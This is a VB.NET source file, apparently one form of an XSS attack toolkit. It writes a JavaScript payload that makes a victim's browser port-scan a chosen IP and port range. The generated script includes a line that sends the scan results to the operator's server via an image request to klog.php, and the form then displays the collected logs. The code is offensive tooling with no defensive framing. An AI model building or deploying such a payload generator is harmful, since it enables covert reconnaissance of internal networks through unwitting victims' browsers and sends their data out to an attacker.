Imports System.IO
Imports System.Threading

Public Class xss_info_portscan

    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles code2.TextChanged

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        Dim j, k As Integer
        If Not Int32.TryParse(TextBox2.Text, j) Or Not Int32.TryParse(TextBox3.Text, k) Or TextBox1.Text = "" Or TextBox2.Text = "" Or TextBox3.Text = "" Or j < 0 Or k > 65355 Then
            MsgBox("Enter a valid IP and Port Number", vbCritical)
        Else
            IO.File.Delete("xss.js")
            Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js")
            stream.WriteLine("var ip ='" & TextBox1.Text & "';")
            stream.WriteLine("var start_port=" & j & "; var end_port=" & k & ";")
            stream.WriteLine(code1.Text)
            stream.WriteLine("new Image().src = 'http://" & xss_server.server_ip & "/klog.php?log='+res;")
            stream.WriteLine(code2.Text)
            stream.Close()
            Button1.Enabled = False
            Timer1.Enabled = True
            System.Threading.Thread.Sleep(4500)
            IO.File.Delete("xss.js")


            MsgBox("Port Scanning takes a while, Please Wait", vbInformation)
        End If

    End Sub

    Private Sub xss_info_portscan_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("logs.txt")
        IO.File.Delete("xss.js")
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("logs.txt")
        Me.Close()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim line As String = ""
        Dim readfile As System.IO.TextReader = New StreamReader(Application.StartupPath & "\logs.txt")
        line = readfile.ReadToEnd()
        If Not line = "" Then
            WebBrowser1.ScriptErrorsSuppressed = True
            WebBrowser1.DocumentText = line
            Timer1.Enabled = False
        End If
        readfile.Close()
        readfile = Nothing
    End Sub
End Class